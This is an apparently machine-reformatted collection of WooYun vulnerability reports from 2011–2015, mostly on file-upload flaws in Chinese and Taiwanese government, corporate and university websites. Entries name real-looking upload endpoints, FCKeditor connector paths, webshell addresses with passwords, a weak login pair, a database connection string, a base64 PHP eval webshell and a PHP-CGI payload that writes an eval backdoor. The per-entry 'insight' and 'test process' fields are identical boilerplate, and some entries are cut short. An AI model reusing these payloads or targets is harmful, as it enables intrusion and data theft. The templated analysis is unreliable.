---
### [wooyun-2011-02894] 360eshop安全网店系统漏洞
**厂商**: 360eshop安全网店系统 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://site/expansion/fckeditor/editor/filemanager/connectors/test.htmlhttp://site/expansion/fckeditor/editor/filemanager/connectors/uploadtest.html这两个页面，是漏洞的关键，格式 x.asa;jpg 顺利上传，文件路径也出来了，/uploadfile/FCK_201109260018186311.ASA;JPG网站成功沦陷、、、

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除这2个test文件，修复编译器过滤.
---

---
### [wooyun-2015-0126597] 某省份大量政府在用系统一处文件上传漏洞
**厂商**: 四川 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键字：你好， 欢迎登录 电子政务大厅！ 3G电子政务大厅案例：http://**.**.**.**:8080/pages/offLine/questerOffLineDeal_old.jsphttp://**.**.**.**:8080/pages/offLine/questerOffLineDeal_old.jsphttp://**.**.**.**:8080/pages/offLine/questerOffLineDeal_old.jsphttp://**.**.**.**:8080/pages/offLine/questerOffLineDeal_old.jsphttp://**.**.**.**:8080/pages/offLine/questerOffLineDeal_old.jsphttp://**.**.**.**:8080/pages/offLine/questerOff

**POC**: http://**.**.**.**:8080/pages/offLine/questerOffLineDeal_old.jsp木马已经删啦以上案例都可以复现

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-023289] 台灣旅遊通网站上传漏洞
**厂商**: 台灣旅遊通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传地址http://365net.tw/about/up/upload_flash.asp?formname=myform&editname=picpath1&uppath=uploadpic&filelx=jpg典型的具有上传漏洞的链接地址操Burp上传asp木马上去一看，早就被蹂躏拉

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 换个上传代码吧，或者去掉上传路径解析权限。
---

---
### [wooyun-2014-052739] 昌图县人民政府门户网设计缺陷
**厂商**: 昌图县人民政府门户网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某政府网应用siteserver，导致注册任意用户，上传脚本文件执行http://www.changtu.gov.cn/index.htm

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 注册码
---

---
### [wooyun-2013-033766] 某企业贷款平台struts任意代码执行泄露贷款信息
**厂商**: 人人米多电子商务（北京）有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 米多小微企业贷款平台struts旧漏洞任意代码执行，数据库面临被拖，管理员信息，用户信息，贷款信息泄露

**POC**: 网址：http://miduo360.com/publicpages/index.action先上一张网站截图，小清新的风格，页面设计的挺不错，截图未打码，工作人员适当打码列目录拿邮件配置拿数据库配置拿管理拿用户测试登录，用户1测试登录，用户2测试管理员说明：本菜鸟用于测试所下载的某些表均已删除，安全测试，谢绝跨省

**绕过**: 直接利用

**修复**: 补丁或更换框架
---

---
### [wooyun-2012-09314] 电信下属某站未认证可上传文件
**厂商**: 电信 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://caigou.chinatelecom.com.cn:8010/ESCM/biddoc/publicDetailTest.do?id=1007

**POC**: http://caigou.chinatelecom.com.cn:8010/ESCM/biddoc/publicDetailTest.do?id=1007

**绕过**: 直接利用

**修复**: 添加权限认证
---

---
### [wooyun-2015-0117295] 新网某系统可泄露大量域名敏感信息如企业营业执照等
**厂商**: 新网华通信息技术有限公司 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看公开漏洞时候看到这个站http://www.ceboss.cn/liyun@xinnet.com---liyun@xinnet.comPS:之前好像报过，没改。看下订单数量，63万左右、包括各种银行的域名信息工商银行试一下侧漏身份证注册信息，公司信息工商银行企业账号信息另外还可以查看短信套餐的账号密码信息用账号密码登陆就可以发短信了哦。还有1000条余量。（冒充银行么）工单信息合同信息同样可以查看域名解析记录另外在企业的资质处，存在任意文件上传~上传成功了苦逼的是我没用找到路径这里点击就是一个下载的请求，并不是不解析jsp还有个查询whois的接口各种大公司都有的只看域名新订单信息。权限挺大，可以各种操作域名信息以及注册人信息

**POC**: 权限挺大，可以各种操作域名信息以及注册人信息

**绕过**: 直接利用

**修复**: 控制
---

---
### [wooyun-2013-036421] 桃源网络硬盘2.x for .NET版本任意文件上传漏洞
**厂商**: 桃源网络硬盘 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有过滤ashx上传1.ashx文件访问目录http://localhost/myfile/用户名/1.ashxtest code：<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.Web;public class Handler : IHttpHandler {public void ProcessRequest (HttpContext context) {context.Response.ContentType = "text/plain";context.Response.Write("path:"+Environment.CurrentDirectory);}public bool IsReusable {get {return false;}}}

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤ashx
---

---
### [wooyun-2015-0151745] 杭州市某教育局旗下某网站任意文件上传漏洞
**厂商**: 杭州市某教育局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/Admin/WebUpload.aspx这里没有权限限制，可以上传文件。上传aspx大马一切正常，但访问该aspx页面地址被安全狗拦截，提示请求的页面包含一些不合理的内容。于是上传另外一个aspx文件，包含该大马文件成功绕过安全狗的查看拦截。服务器信息：最新新闻：

**POC**: 服务器是内网服务器，没有深入渗透。服务器有存在被上传恶意文件的迹象。

**绕过**: 过滤绕过

**修复**: 权限控制，文件上传白名单限制。另外主站域名：http://**.**.**.**/也是同一套程序，但上传时直接被安全狗拦截。但也可能有绕过安全狗的方式，尽量都修复代码。
---

---
### [wooyun-2015-0153265] 光大永明人寿某系统从弱口令到任意文件上传
**厂商**: 光大永明人寿保险有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sleb.learnnow.net.cn看到登录页面上的这个初始密码，我就笑了（111）得到帐号*/111，你无法想象有多少员工是初始密码，这里我就不指出谁了，是一大批人，内部应该自查了

**POC**: 换个帐号再换个在添加公告处存在任意文件上传

**绕过**: 直接利用

**修复**: 删除登录处的弱口令111提示，加强员工的密码强度，上传点过滤
---

---
### [wooyun-2015-0114720] 杭州市建委存在高风险漏洞导致大量数据泄露
**厂商**: 杭州市建委 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: JBOSS漏洞http://202.101.187.114:9091/invoker/EJBInvokerServlethttp://202.101.187.114:9091/invoker/JMXInvokerServlet菜刀数据库<T>XDB</T><X>oracle.jdbc.driver.OracleDriverjdbc:oracle:thin:@ibm:1521jnbdpjnbdp123321jndbnew</X>

**绕过**: 直接利用

**修复**: 安全部署
---

---
### [wooyun-2011-03198] 腾讯RTX上传任意文件漏洞
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简单的一个post表单即可上传$user_account 	= $_POST['user_account'];$file_name 	= $_POST["file_name"];$file_data 	= $_POST["file_data"];无任何过滤

**POC**: user_account=1000file_name=s.phpfile_data=PD9waHAgZXZhbCgkX1BPU1Rbc2JdKT8+file_data为base64_encode数据post提交后UserPhoto目录下生成PhotoFiles/s.php需要extension=php_mbstring.dll开启及php4

**绕过**: 直接利用

**修复**: 上传过滤
---

---
### [wooyun-2011-01684] fckeditor <= 2.6.4 任意文件上传漏洞
**厂商**: fckeditor | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: currentfolder过滤不给力啊，但是GPC就能让它脑残

**POC**: <?error_reporting(0);set_time_limit(0);ini_set("default_socket_timeout", 5);define(STDIN, fopen("php://stdin", "r"));$match = array();function http_send($host, $packet){$sock = fsockopen($host, 80);while (!$sock){print "\n[-] No response from {$host}:80 Trying again...";$sock = fsockopen($host, 80);

**绕过**: 直接利用

**修复**: 参见2.6.4.1修复
---

---
### [wooyun-2012-05922] 百度网盘上传过滤不严格
**厂商**: 百度 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 使用baidu的hi账号登陆，提交bug，上传多个不同类型文件，php，jsp等，后缀未做任何修改，如果攻击者在某个时候发现了其他能够跳过目录，并赋予执行权限的漏洞，就可能对上传服务器的安全形成隐患。http://bs.baidu.com/online-crowdtest/%2F34766_folder.jsphttp://bs.baidu.com/online-crowdtest/%2F34769_2008.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 技术细节参见胡浪宇的上传框架攻击。技术理念参见刺总的《白帽子谈web安全》，白名单不是更安全吗。现在懒得修改后缀，小心年底拉清单。；）
---

---
### [wooyun-2013-038501] 江苏省某县廉政网上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 沛县廉政网Netcms oday上传漏洞http://www.fangxian.gov.cn/user/login.aspx点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 最简单修复方式关闭注册
---

---
### [wooyun-2014-048369] 首都师范大学主页入侵
**厂商**: 首都师范大学 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.cnu.edu.cn/editortpxx/upload.jsp此处为上传点。任意文件上传未过滤。

**POC**: shellroot

**绕过**: 直接利用

**修复**: 删除上传点。。加个验证也行啊。。。。
---

---
### [wooyun-2013-036677] 订餐网站安全漏洞之五-苏州网上订餐系统(火夫网)任意文件上传漏洞
**厂商**: 火夫网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 火夫在线外卖服务网是目前苏州最专业的第三方外卖订购平台。

**POC**: 1，上传地址：http://www.5huofu.com/admin/upfile/upload.html2，shell3，database4，admin

**绕过**: 直接利用

**修复**: 对第三方程序做定制处理：如修改后台路径。修改默认密码，删除第三方账号。上传目录去掉可执行权限等
---

---
### [wooyun-2015-0155457] 华润燃气财务系统存在任意文件上传漏洞（泄漏大量财务数据）
**厂商**: 华润燃气(集团)有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统地址：http://cw.crcgas.com/在扫描的时候发现一个路径http://cw.crcgas.com/upload.asp打开页面后

**POC**: 但我发现不能正常上传，连传图片都失败所以我想，会不会是少了什么东西，比如上传路径的设置Content-Disposition: form-data; name="filepath"/加上后上传到了我设置的根路径下有了路径，所以嘿嘿，我们猥琐一点一句话地址：http://cw.crcgas.com/wooyun.asp密码：1各种财务数据

**绕过**: 直接利用

**修复**: 上传点过滤
---

---
### [wooyun-2014-086397] 某证券OA系统 PHP-CGI远程任意代码执行漏洞
**厂商**: 太平洋证券 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太平洋证券OA系统http://oatest.tpyzq.com/yzmdy.php经检测分析发现，该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行。

**POC**: 直接利用awvs上传<?php echo(system("echo ^<?php @eval(^$^_^POST[^'123456^']);?^>>text.php"));?> 一句话木马用菜刀打开

**绕过**: 直接利用

**修复**: 临时解决方法：使用RewriteRule来过滤请求：RewriteRule规则如下RewriteEngine onRewriteCond %{QUERY_STRING} ^[^=]*$RewriteCond %{QUERY_STRING} %2d|\- [NC]RewriteRule .? - [F
---

---
### [wooyun-2015-095609] 77巧克力官方网站存在fckeditor编辑器上传漏洞
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://www.77.com.tw/admin/FCKeditor/editor/fckeditor.htmlwww.77.com.tw\wuyun.txthttp://www.cadeau.com.tw/wuyun.txthttp://www.test.rivon.com.tw/wuyun.txt我就不一个一个地上传了

**POC**: 能跨全盘，你们懂的。

**绕过**: 直接利用

**修复**: 你们比我更加专业
---

---
### [wooyun-2014-077049] 由一个弱口令引发的中国电信集团多个重要后台侧漏存在任意下载还能给全国管理员发短信等威胁(三)
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #中国电信集团公司产品管理平台#登录点：http://42.99.16.16:8080/productmanager/#账户密码：test  1qaz2wsx本来这个本身的账户好像已经没有什么权限了，什么也看不了。突然在左下角又发现了两个。。#中国电信集团业务工单系统，中国电信集团产品开发管理平台两个平台不能同时登录#第一个，中国电信集团业务工单系统，在默认平台里面的点击右下角业务单管理专区（GET提交密码..）跳转到http://218.80.215.200:8080/pms/MainAction.do点击http://218.80.215.200:8080/pms/index.jsp?type=workSheet#其中基础信息维护部分左边可以发现， 查看管理员通讯录，项目组通讯录。其中用户查询（还需要再点击下右边的查询）可以看全部人员信息，姓名，账户，手机，邮箱，职位，权限。有6000

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2013-018979] 爱丽网某站点存在安全漏洞可致入侵
**厂商**: aili.com | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1）权限控制不严，文件上传直接暴露在公网；http://plus.aili.com/topicLab/index.php?m=user&a=upload&name=2）运维不当，导致nginx解析漏洞；3）然后，然后就直接上菜刀兄了；

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的！
---

---
### [wooyun-2014-047219] 易天团购系统V4.0 蓝色版 免费版上传漏洞
**厂商**: EDayShop | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加上权限认证以及图片认证
---

---
### [wooyun-2014-049325] 中国铁通-网址之家任意文件上传漏洞数百万铁通用户资料
**厂商**: 中国铁通 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://web.10050.net/几百万数据 就这样泄露！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道！
---

---
### [wooyun-2014-065438] 中国电信某站任意文件删除
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 扫荡目录，发现一处上传。任意上传地址（免登陆）：http://hezuo.sh.189.cn/Upload.aspx上传了一个test.txt,页面显示上传成功，但没有返回上传后的路径。经过每个目录的尝试，发现上传后文件在http://hezuo.sh.189.cn/Users/test.txt,经验证，此处上传没有文件类型限制。注册账户adminadmin后登陆，有一处上传，只能上传指定格式。如图上传了test.jpg右边可点击删除。地址为：http://hezuo.sh.189.cn/Users/adminadmin/test.jpg  adminadmin是用户名。先访问刚才的test.txt文件点击删除test.jpg抓包，改包。返回成功删除文件数 1再访问test.txt文件，发现已经没了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-041882] 中细软网络科技有限公司#某站SQL注射已进入后台
**厂商**: gbicom.cn | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是你们旗下的管理的网站吧。。。http://www.hdshangbiao.com/首先看底下的技术支持是 中细软网络科技有限公司然后看见这...又是织梦的 果断...然后利用爬虫找到网站后台果断进入审核大大 快审核 之前的洞都没审核

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我专业
---

---
### [wooyun-2015-095560] TCL集团某站上传漏洞（已成养马场）
**厂商**: TCL官方网上商城 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: TCL集团某站上传漏洞（已成养马场）。上传地址：http://218.106.133.136/FCKeditor//editor/filemanager/connectors/uploadtest.htmlhttp://218.106.133.136/FCKeditor/editor/filemanager/connectors/test.html

**POC**: 如上

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0144934] 秦皇岛人才网任意文件上传漏洞可导致11万用户资料泄露
**厂商**: 秦皇岛人才网 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 秦皇岛人才网 http://www.qhdrc.com/http://www.qhdrc.com/pmodi.php注册用户上传头像可上传任意文件无限制可以上传网马等所有文件无限制权限均为777 可导致网站 11万用户个人资料信息泄露危及服务器 。

**POC**: 通过文件上传上传网马访问服务器文件可查看数据库和网站信息自由下载数据库文件获取用户个人信息和密码由于属于友情测试就没继续下去删除木马 请管理员修复 。

**绕过**: 直接利用

**修复**: 限制文件上传
---

---
### [wooyun-2011-02531] YxShop易想购物商城4.7.1版本任意文件上传漏洞
**厂商**: ShopEx | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其他版本我没测试，估计也是一样的问题http://127.0.0.1/controls/fckeditor/editor/filemanager/browser/default/browser.html?Type=../&Connector=connectors/aspx/connector.aspx跳转到网站根目录上传任意文件。

**POC**: 如果connector.aspx文件被删可用以下exp，copy以下代码另存为html，上传任意文件<form id="frmUpload" enctype="multipart/form-data" action="http://127.0.0.1/controls/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/aspx/upload.aspx?Type=Media" method="post">Upload a new file:<br><input type="file"

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-062191] 中共厦门市思明区委员会党校FCK编辑器上传漏洞
**厂商**: 中共厦门市思明区委员会党校 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: fck路径http://www.smdx.gov.cn/FCKeditor本地构造上传页面看看有没有后门还挺多的，来看看密码是什么一句话地址：http://www.smdx.gov.cn/UploadFiles/file/image.asp;(1).jpg密码：MYTEST（ps：我什么都没传，我是清白的）

**POC**: 菜刀--服务器权限大看看数据库--user表里有部分用户弱口令

**绕过**: 直接利用

**修复**: 1、彻底检查一下服务器；2、修复用户的弱口令；3、fck加授权；4、升级iis；等等
---

---
### [wooyun-2014-054409] 某市地震局信息公开系统存在fck漏洞
**厂商**: 某市地震局信息公开系统 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 郑州市地震局政府信息公开管理系统使用fckeditor文章编辑器，存在任意文件上传漏洞！访问地址：http://www.zzeq.gov.cn:8080/fckeditor/editor/filemanager/browser/default/browser.html?Type=../../..&Connector=connectors/jsp/connector

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 他们懂得~~
---

---
### [wooyun-2013-039506] 夏普分站验证绕过漏洞及上传漏洞
**厂商**: 夏普 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 夏普子站（夏普经销商专区后台管理）漏洞在登陆界面http://docsys.sharp.cn:8006/dealer/system/login.jsp用户填写'密码随便，便可进入后台。右键源码http://docsys.sharp.cn:8006/dealer/system/frame/left.html里有新闻管理，上传不限制，任意文件上传。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070996] 某政府考试中心FCK导致考生资料外泄
**厂商**: www.csks.gov.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传：菜刀：http://www.csks.gov.cn/csjsj/webregister/index.aspx数据库中有挂旗帜的考试系统，数据库权限较高，可以获取该考试中心所有报考考生数据库。我报名后有收到骚扰短信跟电话。怀疑已经被黑产利用。

**POC**: 上传：菜刀：http://www.csks.gov.cn/csjsj/webregister/index.aspx数据库中有挂旗帜的考试系统，数据库权限较高，可以获取该考试中心所有报考考生数据库。

**绕过**: 直接利用

**修复**: FCK修补；建议数据库权限细化。
---

---
### [wooyun-2011-02052] 百度分站存在高危BUG
**厂商**: 百度 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pmstar.baidu.com/baidu2011/IndexPage.aspx存在高危FCK编辑器漏洞！

**POC**: http://pmstar.baidu.com//FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/aspx/connector.aspx

**绕过**: 直接利用

**修复**: 您懂的！
---

---
### [wooyun-2014-060246] 芜湖市林业信息网任意文件上传
**厂商**: 芜湖市林业信息网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.ahwhly.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp上传

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2012-013737] 赛格网图片上传导致全站沦陷，数据泄露
**厂商**: 深圳市赛格电子商务有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点蛮大的，先注册。登入后，选择我的赛格，公司信息看到下面有上传图片，,抓包修改文件名aspx直接上传，无任何提示，

**POC**: 用户不少，我什么都没看，只select 一下

**绕过**: 直接利用

**修复**: 将强文件类型判断，限制危险文件上传
---

---
### [wooyun-2012-06775] 对36氪的一次渗透测试
**厂商**: 36氪科技博客 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天无意看到wooyun（http://weibo.com/wooyun2）微博中转发了36氪的某微博，然后手戝点了一下，看到36氪的主页(http://www.36kr.com/)，WordPress程序，没搞头呀（手上有oady的可以wooyun一下），于是试试渗透吧。于是看到投资人服务那里有个分站链接：http://vc.36tr.com/ 注册个创业者身份看看有些什么内容吧。创业者可以上传头像，创建产品什么的。习惯性动作，上传头像抓包改包上传。但经过数次测试，发现上传非图片文件，名称后辍自动加上“_”，即上传 .php 去变成了 ._php 这样的文件不被解释呀。。。但这个过程中也会暴出图片处理的错误信息如下：#0 [2 : getimagesize(/var/www/36tree_v2.0/mars/host/http://vc.36tr.com:80/avatar_image/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 注意分站安全。其它应该懂得。
---

---
### [wooyun-2013-046749] 浙江科技统计局上传导致整站沦陷
**厂商**: 浙江科技统计局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 编辑器上传地址http://sb.zjinfo.gov.cn/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector通过burp改包可上传jsp导致整站沦陷

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-077386] 广东药学院护理学院FCK上传漏洞
**厂商**: 广东药学院 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

